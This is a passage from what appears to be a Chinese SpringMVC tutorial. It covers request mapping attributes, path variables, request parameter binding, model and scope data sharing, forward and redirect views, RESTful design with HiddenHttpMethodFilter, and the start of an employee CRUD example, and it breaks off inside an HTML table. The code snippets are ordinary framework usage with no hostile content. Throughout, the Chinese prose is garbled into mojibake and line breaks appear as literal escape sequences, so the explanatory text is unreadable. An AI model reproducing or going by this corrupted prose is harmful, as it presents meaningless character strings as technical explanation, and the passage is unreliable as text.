1ãå¯¹äºå¤çæå®è¯·æ±æ¹å¼çæ§å¶å¨æ¹æ³ï¼SpringMVCä¸­æä¾äº@RequestMappingçæ´¾çæ³¨è§£\n> \n> å¤çgetè¯·æ±çæ å°--\x3e@GetMapping\n> \n> å¤çpostè¯·æ±çæ å°--\x3e@PostMapping\n> \n> å¤çputè¯·æ±çæ å°--\x3e@PutMapping\n> \n> å¤çdeleteè¯·æ±çæ å°--\x3e@DeleteMapping\n> \n> 2ãå¸¸ç¨çè¯·æ±æ¹å¼ægetï¼postï¼putï¼delete\n> \n> ä½æ¯ç®åæµè§å¨åªæ¯ægetåpostï¼è¥å¨formè¡¨åæäº¤æ¶ï¼ä¸ºmethodè®¾ç½®äºå¶ä»è¯·æ±æ¹å¼çå­ç¬¦ä¸²ï¼putædeleteï¼ï¼åæç§é»è®¤çè¯·æ±æ¹å¼getå¤ç\n> \n> è¥è¦åéputådeleteè¯·æ±ï¼åéè¦éè¿springæä¾çè¿æ»¤å¨HiddenHttpMethodFilterï¼å¨RESTfulé¨åä¼è®²å°ã\n\n\n# @RequestMappingæ³¨è§£çparamså±æ§\n\n@RequestMappingæ³¨è§£çparamså±æ§éè¿è¯·æ±çè¯·æ±åæ°å¹éè¯·æ±æ å° @RequestMappingæ³¨è§£çparamså±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²ç±»åçæ°ç»ï¼å¯ä»¥éè¿åç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±åæ°åè¯·æ±æ å°çå¹éå³ç³» "param"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦paramè¯·æ±åæ° "!param"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»ä¸è½æºå¸¦paramè¯·æ±åæ° "param=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦paramè¯·æ±åæ°ä¸param=value "param!=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦paramè¯·æ±åæ°ä½æ¯param!=value\n\n<a th:href="@{/test/testParam(username=\'zhangsan\',password=123456)}" >æµè¯param</a>\n\n\n1\n\n\n@RequestMapping(value = "testParam",method = RequestMethod.GET,params = {"!haha","username=zhangsan"})  \npublic String testParam(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n> æ³¨ï¼ è¥å½åè¯·æ±æ»¡è¶³@RequestMappingæ³¨è§£çvalueåmethodå±æ§ï¼ä½æ¯ä¸æ»¡è¶³paramså±æ§ï¼æ­¤æ¶é¡µé¢åæ¥é400ï¼Parameter conditions "username, password!=123456" not met for actual request parameters: username={admin}, password={123456}\n\n\n# @RequestMappingæ³¨è§£çheaderså±æ§\n\n@RequestMappingæ³¨è§£çheaderså±æ§éè¿è¯·æ±çè¯·æ±å¤´ä¿¡æ¯å¹éè¯·æ±æ å°\n\n@RequestMappingæ³¨è§£çheaderså±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²ç±»åçæ°ç»ï¼å¯ä»¥éè¿åç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±å¤´ä¿¡æ¯åè¯·æ±æ å°çå¹éå³ç³»\n\n"header"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯\n\n"!header"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»ä¸è½æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯\n\n"header=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯ä¸header=value\n\n"header!=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯ä¸header!=value\n\nè¥å½åè¯·æ±æ»¡è¶³@RequestMappingæ³¨è§£çvalueåmethodå±æ§ï¼ä½æ¯ä¸æ»¡è¶³headerså±æ§ï¼æ­¤æ¶é¡µé¢æ¾ç¤º404éè¯¯ï¼å³èµæºæªæ¾å°\n\n\n# SpringMVCæ¯æanté£æ ¼çè·¯å¾\n\nï¼ï¼è¡¨ç¤ºä»»æçåä¸ªå­ç¬¦\n\n*ï¼è¡¨ç¤ºä»»æç0ä¸ªæå¤ä¸ªå­ç¬¦\n\n**ï¼è¡¨ç¤ºä»»æçä¸å±æå¤å±ç®å½\n\næ³¨æï¼å¨ä½¿ç¨**æ¶ï¼åªè½ä½¿ç¨/**/xxxçæ¹å¼\n\n\n# SpringMVCæ¯æè·¯å¾ä¸­çå ä½ç¬¦\n\nåå§æ¹å¼ï¼/deleteUser?id=1\n\nRESTæ¹å¼ï¼/user/1 è¯·æ±æ¹å¼ä¸ºï¼delete\n\nSpringMVCè·¯å¾ä¸­çå ä½ç¬¦å¸¸ç¨äºRESTfulé£æ ¼ä¸­ï¼å½è¯·æ±è·¯å¾ä¸­å°æäºæ°æ®éè¿è·¯å¾çæ¹å¼ä¼ è¾å°æå¡å¨ä¸­ï¼å°±å¯ä»¥å¨ç¸åºç@RequestMappingæ³¨è§£çvalueå±æ§ä¸­éè¿å ä½ç¬¦{xxx}è¡¨ç¤ºä¼ è¾çæ°æ®ï¼å¨éè¿@PathVariableæ³¨è§£ï¼å°å ä½ç¬¦æè¡¨ç¤ºçæ°æ®èµå¼ç»æ§å¶å¨æ¹æ³çå½¢å\n\n<a th:href="@{/test/testParam2/1/2/3/4/}" >æµè¯ /1/2/3/4/</a>\n\n\n1\n\n\n@RequestMapping(value = "/testParam2/{p1}/{p2}/{p3}/{p4}")  \npublic String testParam2(@PathVariable("p1") String p1,@PathVariable("p2") String p2,@PathVariable("p3") String p3,@PathVariable("p4") String p4){  \n System.out.println(p1+p2+p3+p4);  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# SpringMVCè·åè¯·æ±åæ°\n\n\n# éè¿ServletAPIè·å\n\nå°HttpServletRequestä½ä¸ºæ§å¶å¨æ¹æ³çå½¢åï¼æ­¤æ¶HttpServletRequestç±»åçåæ°è¡¨ç¤ºå°è£äºå½åè¯·æ±çè¯·æ±æ¥æçå¯¹è±¡\n\n<a th:href="@{/test/testServletReq(username=\'zhangsan\',password=1234)}">æµè¯ä»servletapiè·ååæ°</a>\n\n\n1\n\n\n@RequestMapping("/testServletReq")  \npublic String testServletReq(HttpServletRequest request){  \n String username = request.getParameter("username");  \n String password = request.getParameter("password");  \n System.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n// æ§å¶å°è¾åºï¼username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éè¿æ§å¶å¨æ¹æ³çå½¢åè·åè¯·æ±åæ°\n\nå¨æ§å¶å¨æ¹æ³çå½¢åä½ç½®ï¼è®¾ç½®åè¯·æ±åæ°ååçå½¢åï¼å½æµè§å¨åéè¯·æ±ï¼å¹éå°è¯·æ±æ å°æ¶ï¼å¨DispatcherServletä¸­å°±ä¼å°è¯·æ±åæ°èµå¼ç»ç¸åºçå½¢åã\n\n<a th:href="@{/test/testController(username=\'zhangsan\',password=1234)}">æµè¯ä»æ§å¶å¨è·ååæ°</a>\n\n\n1\n\n\n@RequestMapping("/testController")  \npublic String testServletReq(String username,String password){  \n System.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n//æ§å¶å°è¾åºï¼username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> æ³¨ï¼ è¥è¯·æ±æä¼ è¾çè¯·æ±åæ°ä¸­æå¤ä¸ªååçè¯·æ±åæ°ï¼æ­¤æ¶å¯ä»¥å¨æ§å¶å¨æ¹æ³çå½¢åä¸­è®¾ç½®å­ç¬¦ä¸²æ°ç»æèå­ç¬¦ä¸²ç±»åçå½¢åæ¥æ¶æ­¤è¯·æ±åæ° è¥ä½¿ç¨å­ç¬¦ä¸²æ°ç»ç±»åçå½¢åï¼æ­¤åæ°çæ°ç»ä¸­åå«äºæ¯ä¸ä¸ªæ°æ® è¥ä½¿ç¨å­ç¬¦ä¸²ç±»åçå½¢åï¼æ­¤åæ°çå¼ä¸ºæ¯ä¸ªæ°æ®ä¸­é´ä½¿ç¨éå·æ¼æ¥çç»æ\n\n\n# @RequestParam\n\n@RequestParamæ¯å°è¯·æ±åæ°åæ§å¶å¨æ¹æ³çå½¢ååå»ºæ å°å³ç³» @RequestParamæ³¨è§£ä¸å±æä¸ä¸ªå±æ§ï¼\n\n * valueï¼æå®ä¸ºå½¢åèµå¼çè¯·æ±åæ°çåæ°å\n\n * requiredï¼è®¾ç½®æ¯å¦å¿é¡»ä¼ è¾æ­¤è¯·æ±åæ°ï¼é»è®¤å¼ä¸ºtrue\n   \n   è¥è®¾ç½®ä¸ºtrueæ¶ï¼åå½åè¯·æ±å¿é¡»ä¼ è¾valueææå®çè¯·æ±åæ°ï¼è¥æ²¡æä¼ è¾è¯¥è¯·æ±åæ°ï¼ä¸æ²¡æè®¾ç½®defaultValueå±æ§ï¼åé¡µé¢æ¥é400ï¼Required String parameter \'xxx\' is not presentï¼è¥è®¾ç½®ä¸ºfalseï¼åå½åè¯·æ±ä¸æ¯å¿é¡»ä¼ è¾valueææå®çè¯·æ±åæ°ï¼è¥æ²¡æä¼ è¾ï¼åæ³¨è§£ææ è¯çå½¢åçå¼ä¸ºnull\n\n * defaultValueï¼ä¸ç®¡requiredå±æ§å¼ä¸ºtrueæfalseï¼å½valueææå®çè¯·æ±åæ°æ²¡æä¼ è¾æä¼ è¾çå¼ä¸º""æ¶ï¼åä½¿ç¨é»è®¤å¼ä¸ºå½¢åèµå¼\n\n\n# @RequestHeader\n\n@RequestHeaderæ¯å°è¯·æ±å¤´ä¿¡æ¯åæ§å¶å¨æ¹æ³çå½¢ååå»ºæ å°å³ç³» @RequestHeaderæ³¨è§£ä¸å±æä¸ä¸ªå±æ§ï¼valueãrequiredãdefaultValueï¼ç¨æ³å@RequestParam\n\n\n# @CookieValue\n\n@CookieValueæ¯å°cookieæ°æ®åæ§å¶å¨æ¹æ³çå½¢ååå»ºæ å°å³ç³» @CookieValueæ³¨è§£ä¸å±æä¸ä¸ªå±æ§ï¼valueãrequiredãdefaultValueï¼ç¨æ³å@RequestParam\n\n\n# éè¿POJOè·åè¯·æ±åæ°\n\nå¯ä»¥å¨æ§å¶å¨æ¹æ³çå½¢åä½ç½®è®¾ç½®ä¸ä¸ªå®ä½ç±»ç±»åçå½¢åï¼æ­¤æ¶è¥æµè§å¨ä¼ è¾çè¯·æ±åæ°çåæ°ååå®ä½ç±»ä¸­çå±æ§åä¸è´ï¼é£ä¹è¯·æ±åæ°å°±ä¼ä¸ºæ­¤å±æ§èµå¼ã\n\n<form th:action="@{/test/testEntity}" method="post">  \n <input type="text" value="zhangsan" name="username"> <br>  \n <input type="text" value="123456" name="password"> <br>  \n <input type="text" value="email" name="email"> <br>  \n <input type="submit" value="æµè¯å®ä½æ³¨å¥å±æ§">  \n</form>\n\n\n1\n2\n3\n4\n5\n6\n\n\n@RequestMapping(value = "/testEntity",method = RequestMethod.POST)  \npublic String testEntity(User user){  \n System.out.println(user);  \n return "success";  \n}\n\n// User{id=\'null\', username=\'zhangsan\', password=\'123456\', email=\'email\'}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢\n\nä¹±ç é®é¢åä¸ºä¸¤ç§ï¼ç¬¬ä¸ç§ä¸ºgetè¯·æ±åæ°ä¹±ç é®é¢ï¼è§£å³åæ³å¨ JavaWebä¸­æå°ï¼å¯ä»¥å¨Tomcatéç½®æä»¶ä¸­éç½®ãç¬¬äºç§ä¸ºPOSTè¯·æ±åæ°ä¹±ç ï¼å¯ä»¥éç½®è¿æ»¤å¨è¿è¡è®¾ç½®ç¼ç æ ¼å¼ã è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢ï¼å¯ä»¥ä½¿ç¨SpringMVCæä¾çç¼ç è¿æ»¤å¨CharacterEncodingFilterï¼ä½æ¯å¿é¡»å¨web.xmlä¸­è¿è¡æ³¨åã\n\n<filter>  \n <filter-name>CharacterEncodingFilter</filter-name>  \n <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>  \n <init-param>  \n <param-name>encoding</param-name>  \n <param-value>utf-8</param-value>  \n </init-param>  \n <init-param>  \n <param-name>forceResponseEncoding</param-name>  \n <param-value>true</param-value>  \n </init-param>  \n</filter>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> æ³¨ï¼ SpringMVCä¸­å¤çç¼ç çè¿æ»¤å¨ä¸å®è¦éç½®å°å¶ä»è¿æ»¤å¨ä¹åï¼å¦åæ æ\n\n\n# åå¯¹è±¡å±äº«æ°æ®\n\n\n# ä½¿ç¨ServletAPIårequeståå¯¹è±¡å±äº«æ°æ®\n\n@RequestMapping("/testServletAPI")  \npublic String testServletAPI(HttpServletRequest request){  \n request.setAttribute("testScope","hello,ServletAPI");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ä½¿ç¨ModelAndViewårequeståå¯¹è±¡å±äº«æ°æ®\n\n@RequestMapping("/testModelAndView")  \npublic ModelAndView testModelAndView(){  \n ModelAndView modelAndView = new ModelAndView();  \n modelAndView.setViewName("success");  \n modelAndView.addObject("testScope","hello,modelandView");  \n return modelAndView;  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# ä½¿ç¨Modelårequeståå¯¹è±¡å±äº«æ°æ®\n\n@RequestMapping("/testModel")  \npublic String testModelAndView(Model model){  \n model.addAttribute("testScope","hello,Model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ä½¿ç¨mapårequeståå¯¹è±¡å±äº«æ°æ®\n\n@RequestMapping("/testMap")  \npublic String testMap(Map<String,Object> map){  \n map.put("testScope","hello,Model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ä½¿ç¨ModelMapårequeståå¯¹è±¡å±äº«æ°æ®\n\n@RequestMapping("/testModelMap")  \npublic String testModelMap(ModelMap modelMap){  \n modelMap.put("testScope","hello,modelMap");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ModelãModelMapãMapçå³ç³»\n\nModelãModelMapãMapç±»åçåæ°å¶å®æ¬è´¨ä¸é½æ¯ BindingAwareModelMap ç±»åç\n\npublic interface Model{}\npublic class ModelMap extends LinkedHashMap<String, Object> {}\npublic class ExtendedModelMap extends ModelMap implements Model {}\npublic class BindingAwareModelMap extends ExtendedModelMap {}\n\n\n1\n2\n3\n4\n\n\n\n# sessionåå±äº«æ°æ®\n\n<p th:text="${session.testScope}" ></p>\n\n\n1\n\n\n@RequestMapping("/testSession")  \npublic String testSession(HttpSession session){  \n session.setAttribute("testScope","hello,session");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# applicationåå±äº«æ°æ®\n\n<p th:text="${application.testScope}" ></p>\n\n\n1\n\n\n@RequestMapping("/testApplication")  \npublic String testApplication(HttpSession session){  \n ServletContext servletContext = session.getServletContext();  \n servletContext.setAttribute("testScope","hello,application");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# SpringMVCçè§å¾\n\nSpringMVCä¸­çè§å¾æ¯Viewæ¥å£ï¼è§å¾çä½ç¨æ¸²ææ°æ®ï¼å°æ¨¡åModelä¸­çæ°æ®å±ç¤ºç»ç¨æ· SpringMVCè§å¾çç§ç±»å¾å¤ï¼é»è®¤æè½¬åè§å¾åéå®åè§å¾ å½å·¥ç¨å¼å¥jstlçä¾èµï¼è½¬åè§å¾ä¼èªå¨è½¬æ¢ä¸ºJstlView è¥ä½¿ç¨çè§å¾ææ¯ä¸ºThymeleafï¼å¨SpringMVCçéç½®æä»¶ä¸­éç½®äºThymeleafçè§å¾è§£æå¨ï¼ç±æ­¤è§å¾è§£æå¨è§£æä¹åæå¾å°çæ¯ThymeleafViewã\n\n\n# ThymeleafView\n\nå½æ§å¶å¨æ¹æ³ä¸­æè®¾ç½®çè§å¾åç§°æ²¡æä»»ä½åç¼æ¶ï¼æ­¤æ¶çè§å¾åç§°ä¼è¢«SpringMVCéç½®æä»¶ä¸­æéç½®çè§å¾è§£æå¨è§£æï¼è§å¾åç§°æ¼æ¥è§å¾åç¼åè§å¾åç¼æå¾å°çæç»è·¯å¾ï¼ä¼éè¿è½¬åçæ¹å¼å®ç°è·³è½¬ã\n\n@RequestMapping("/test")  \npublic String test(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# è½¬åè§å¾\n\nSpringMVCä¸­é»è®¤çè½¬åè§å¾æ¯InternalResourceView SpringMVCä¸­åå»ºè½¬åè§å¾çæåµï¼ å½æ§å¶å¨æ¹æ³ä¸­æè®¾ç½®çè§å¾åç§°ä»¥"forward:"ä¸ºåç¼æ¶ï¼åå»ºInternalResourceViewè§å¾ï¼æ­¤æ¶çè§å¾åç§°ä¸ä¼è¢«SpringMVCéç½®æä»¶ä¸­æéç½®çè§å¾è§£æå¨è§£æï¼èæ¯ä¼å°åç¼"forward:"å»æï¼å©ä½é¨åä½ä¸ºæç»è·¯å¾éè¿è½¬åçæ¹å¼å®ç°è·³è½¬\n\nä¾å¦"forward:/"ï¼"forward:/employee"\n\n@RequestMapping("/testForward")\npublic String testForward(){\n    return "forward:/testHello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# éå®åè§å¾\n\nSpringMVCä¸­é»è®¤çéå®åè§å¾æ¯RedirectView å½æ§å¶å¨æ¹æ³ä¸­æè®¾ç½®çè§å¾åç§°ä»¥"redirect:"ä¸ºåç¼æ¶ï¼åå»ºRedirectViewè§å¾ï¼æ­¤æ¶çè§å¾åç§°ä¸ä¼è¢«SpringMVCéç½®æä»¶ä¸­æéç½®çè§å¾è§£æå¨è§£æï¼èæ¯ä¼å°åç¼"redirect:"å»æï¼å©ä½é¨åä½ä¸ºæç»è·¯å¾éè¿éå®åçæ¹å¼å®ç°è·³è½¬\n\nä¾å¦"redirect:/"ï¼"redirect:/employee"\n\n@RequestMapping("/testRedirect")\npublic String testRedirect(){\n    return "redirect:/testHello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n> æ³¨ï¼ éå®åè§å¾å¨è§£ææ¶ï¼ä¼åå°redirect:åç¼å»æï¼ç¶åä¼å¤æ­å©ä½é¨åæ¯å¦ä»¥/å¼å¤´ï¼è¥æ¯åä¼èªå¨æ¼æ¥ä¸ä¸æè·¯å¾ã\n\n\n# è§å¾æ§å¶å¨view-controller\n\nå½æ§å¶å¨æ¹æ³ä¸­ï¼ä»ä»ç¨æ¥å®ç°é¡µé¢è·³è½¬ï¼å³åªéè¦è®¾ç½®è§å¾åç§°æ¶ï¼å¯ä»¥å°å¤çå¨æ¹æ³ä½¿ç¨view-controlleræ ç­¾è¿è¡è¡¨ç¤ºã\n\n\x3c!--\n    pathï¼è®¾ç½®å¤ççè¯·æ±å°å\n    view-nameï¼è®¾ç½®è¯·æ±å°åæå¯¹åºçè§å¾åç§°\n--\x3e\n<mvc:view-controller path="/testView" view-name="success"></mvc:view-controller>\n\n\n1\n2\n3\n4\n5\n\n\n> æ³¨ï¼ å½SpringMVCä¸­è®¾ç½®ä»»ä½ä¸ä¸ªview-controlleræ¶ï¼å¶ä»æ§å¶å¨ä¸­çè¯·æ±æ å°å°å¨é¨å¤±æï¼æ­¤æ¶éè¦å¨SpringMVCçæ ¸å¿éç½®æä»¶ä¸­è®¾ç½®å¼å¯mvcæ³¨è§£é©±å¨çæ ç­¾ï¼ <mvc:annotation-driven />\n\n\n# RESTful\n\n\n# RESTfulç®ä»\n\nRESTï¼Representational State Transferï¼è¡¨ç°å±èµæºç¶æè½¬ç§»ã\n\n# èµæº\n\nèµæºæ¯ä¸ç§çå¾æå¡å¨çæ¹å¼ï¼å³ï¼å°æå¡å¨çä½æ¯ç±å¾å¤ç¦»æ£çèµæºç»æãæ¯ä¸ªèµæºæ¯æå¡å¨ä¸ä¸ä¸ªå¯å½åçæ½è±¡æ¦å¿µãå ä¸ºèµæºæ¯ä¸ä¸ªæ½è±¡çæ¦å¿µï¼æä»¥å®ä¸ä»ä»è½ä»£è¡¨æå¡å¨æä»¶ç³»ç»ä¸­çä¸ä¸ªæä»¶ãæ°æ®åºä¸­çä¸å¼ è¡¨ç­ç­å·ä½çä¸è¥¿ï¼å¯ä»¥å°èµæºè®¾è®¡çè¦å¤æ½è±¡æå¤æ½è±¡ï¼åªè¦æ³è±¡ååè®¸èä¸å®¢æ·ç«¯åºç¨å¼åèè½å¤çè§£ãä¸é¢åå¯¹è±¡è®¾è®¡ç±»ä¼¼ï¼èµæºæ¯ä»¥åè¯ä¸ºæ ¸å¿æ¥ç»ç»çï¼é¦åå³æ³¨çæ¯åè¯ãä¸ä¸ªèµæºå¯ä»¥ç±ä¸ä¸ªæå¤ä¸ªURIæ¥æ è¯ãURIæ¢æ¯èµæºçåç§°ï¼ä¹æ¯èµæºå¨Webä¸çå°åãå¯¹æä¸ªèµæºæå´è¶£çå®¢æ·ç«¯åºç¨ï¼å¯ä»¥éè¿èµæºçURIä¸å¶è¿è¡äº¤äºã\n\n# èµæºçè¡¨è¿°\n\nèµæºçè¡¨è¿°æ¯ä¸æ®µå¯¹äºèµæºå¨æä¸ªç¹å®æ¶å»çç¶æçæè¿°ãå¯ä»¥å¨å®¢æ·ç«¯-æå¡å¨ç«¯ä¹é´è½¬ç§»ï¼äº¤æ¢ï¼ãèµæºçè¡¨è¿°å¯ä»¥æå¤ç§æ ¼å¼ï¼ä¾å¦HTML/XML/JSON/çº¯ææ¬/å¾ç/è§é¢/é³é¢ç­ç­ãèµæºçè¡¨è¿°æ ¼å¼å¯ä»¥éè¿ååæºå¶æ¥ç¡®å®ãè¯·æ±-ååºæ¹åçè¡¨è¿°éå¸¸ä½¿ç¨ä¸åçæ ¼å¼ã\n\n# ç¶æè½¬ç§»\n\nç¶æè½¬ç§»è¯´çæ¯ï¼å¨å®¢æ·ç«¯åæå¡å¨ç«¯ä¹é´è½¬ç§»ï¼transferï¼ä»£è¡¨èµæºç¶æçè¡¨è¿°ãéè¿è½¬ç§»åæä½èµæºçè¡¨è¿°ï¼æ¥é´æ¥å®ç°æä½èµæºçç®çã\n\n\n# RESTfulçå®ç°\n\nå·ä½è¯´ï¼å°±æ¯ HTTP åè®®éé¢ï¼åä¸ªè¡¨ç¤ºæä½æ¹å¼çå¨è¯ï¼GETãPOSTãPUTãDELETEã å®ä»¬åå«å¯¹åºåç§åºæ¬æä½ï¼GET ç¨æ¥è·åèµæºï¼POST ç¨æ¥æ°å»ºèµæºï¼PUT ç¨æ¥æ´æ°èµæºï¼DELETE ç¨æ¥å é¤èµæºã REST é£æ ¼æå¡ URL å°åä½¿ç¨ç»ä¸çé£æ ¼è®¾è®¡ï¼ä»åå°ååä¸ªåè¯ä½¿ç¨ææ åå¼ï¼ä¸ä½¿ç¨é®å·é®å¼å¯¹æ¹å¼æºå¸¦è¯·æ±åæ°ï¼èæ¯å°è¦åéç»æå¡å¨çæ°æ®ä½ä¸º URL å°åçä¸é¨åï¼ä»¥ä¿è¯æ´ä½é£æ ¼çä¸è´æ§ã\n\næä½     ä¼ ç»æ¹å¼               RESTé£æ ¼\næ¥è¯¢æä½   getUserById?id=1   user/1--\x3egetè¯·æ±æ¹å¼\nä¿å­æä½   saveUser           user--\x3epostè¯·æ±æ¹å¼\nå é¤æä½   deleteUser?id=1    user/1--\x3edeleteè¯·æ±æ¹å¼\næ´æ°æä½   updateUser         user--\x3eputè¯·æ±æ¹å¼\n\n\n# HiddenHttpMethodFilter\n\nç±äºæµè§å¨åªæ¯æåégetåpostæ¹å¼çè¯·æ±ï¼é£ä¹è¯¥å¦ä½åéputådeleteè¯·æ±å¢ï¼ SpringMVC æä¾äº HiddenHttpMethodFilter å¸®å©æä»¬å° POST è¯·æ±è½¬æ¢ä¸º DELETE æ PUT è¯·æ± HiddenHttpMethodFilter å¤çputådeleteè¯·æ±çæ¡ä»¶ï¼\n\n * å½åè¯·æ±çè¯·æ±æ¹å¼å¿é¡»ä¸ºpost\n * å½åè¯·æ±å¿é¡»ä¼ è¾è¯·æ±åæ°_method æ»¡è¶³ä»¥ä¸æ¡ä»¶ï¼HiddenHttpMethodFilter è¿æ»¤å¨å°±ä¼å°å½åè¯·æ±çè¯·æ±æ¹å¼è½¬æ¢ä¸ºè¯·æ±åæ°_methodçå¼ï¼å æ­¤è¯·æ±åæ°_methodçå¼ææ¯æç»çè¯·æ±æ¹å¼\n\nå¨web.xmlä¸­æ³¨åHiddenHttpMethodFilter\n\n<filter>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> æ³¨ï¼ ç®åä¸ºæ­¢ï¼SpringMVCä¸­æä¾äºä¸¤ä¸ªè¿æ»¤å¨ï¼CharacterEncodingFilteråHiddenHttpMethodFilter å¨web.xmlä¸­æ³¨åæ¶ï¼å¿é¡»åæ³¨åCharacterEncodingFilterï¼åæ³¨åHiddenHttpMethodFilter åå ï¼\n> \n>  1. å¨ CharacterEncodingFilter ä¸­éè¿ request.setCharacterEncoding(encoding) æ¹æ³è®¾ç½®å­ç¬¦éç\n>  2. request.setCharacterEncoding(encoding) æ¹æ³è¦æ±åé¢ä¸è½æä»»ä½è·åè¯·æ±åæ°çæä½\n>  3. è HiddenHttpMethodFilter æ°æ°æä¸ä¸ªè·åè¯·æ±æ¹å¼çæä½ï¼String paramValue = request.getParameter(this.methodParam);\n\n\n# RESTfulæ¡ä¾\n\n# åå¤å·¥ä½\n\n 1. å®ä½ç±»\n\npublic class Employee {\n\nprivate Integer id; private String lastName;\n\nprivate String email; //1 male, 0 female private Integer gender;\n\npublic Integer getId() { return id; }\n\npublic void setId(Integer id) { this.id = id; }\n\npublic String getLastName() { return lastName; }\n\npublic void setLastName(String lastName) { this.lastName = lastName; }\n\npublic String getEmail() { return email; }\n\npublic void setEmail(String email) { this.email = email; }\n\npublic Integer getGender() { return gender; }\n\npublic void setGender(Integer gender) { this.gender = gender; }\n\npublic Employee(Integer id, String lastName, String email, Integer gender) { super(); this.id = id; this.lastName = lastName; this.email = email; this.gender = gender; }\n\npublic Employee() { } }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. Daoå±æ¨¡ææ°æ®\n\npackage com.atguigu.mvc.dao;\n\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport com.atguigu.mvc.bean.Employee;\nimport org.springframework.stereotype.Repository;\n\n\n\n@Repository public class EmployeeDao {\n\n\nprivate static Map<Integer, Employee> employees = null;\n\nstatic{\nemployees = new HashMap<Integer, Employee>();\n\nemployees.put(1001, new Employee(1001, "E-AA", "aa@163.com", 1));\nemployees.put(1002, new Employee(1002, "E-BB", "bb@163.com", 1));\nemployees.put(1003, new Employee(1003, "E-CC", "cc@163.com", 0));\nemployees.put(1004, new Employee(1004, "E-DD", "dd@163.com", 0));\nemployees.put(1005, new Employee(1005, "E-EE", "ee@163.com", 1));\n}\n\nprivate static Integer initId = 1006;\n\npublic void save(Employee employee){\nif(employee.getId() == null){\nemployee.setId(initId++);\n}\nemployees.put(employee.getId(), employee);\n}\n\npublic Collection<Employee> getAll(){\nreturn employees.values();\n}\n\npublic Employee get(Integer id){\nreturn employees.get(id);\n}\n\npublic void delete(Integer id){\nemployees.remove(id);\n}\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n# å¯¹åºåè½åè¡¨\n\nåè½           URL å°å        è¯·æ±æ¹å¼\nè®¿é®é¦é¡µâ        /             GET\næ¥è¯¢å¨é¨æ°æ®â      /employee     GET\nå é¤â          /employee/2   DELETE\nè·³è½¬å°æ·»å æ°æ®é¡µé¢â   /toAdd        GET\næ§è¡ä¿å­â        /employee     POST\nè·³è½¬å°æ´æ°æ°æ®é¡µé¢â   /employee/2   GET\næ§è¡æ´æ°â        /employee     PUT\n\n# è®¿é®é¦é¡µåè½\n\n 1. åå»ºé¡µé¢\n\n<!DOCTYPE html>  \n<html lang="en" xmlns:th="http://www.thymeleaf.org">  \n<head>  \n <meta charset="UTF-8" >  \n <title>Title</title>  \n</head>  \n<body>  \n<h1>é¦é¡µ</h1>  \n<a th:href="@{/employee}">è®¿é®åå·¥ä¿¡æ¯</a>  \n</body>  \n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. éç½®view-controller\n\n<mvc:view-controller path="/" view-name="index"/>\n\n\n1\n\n\n# æ¥è¯¢ææåå·¥ä¿¡æ¯åè½\n\n 1. åå»ºé¡µé¢\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Employee Info</title>\n    <script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n</head>\n<body>\n\n    <table border="1" cellpadding="0" cellspacing="0" style="text-align: 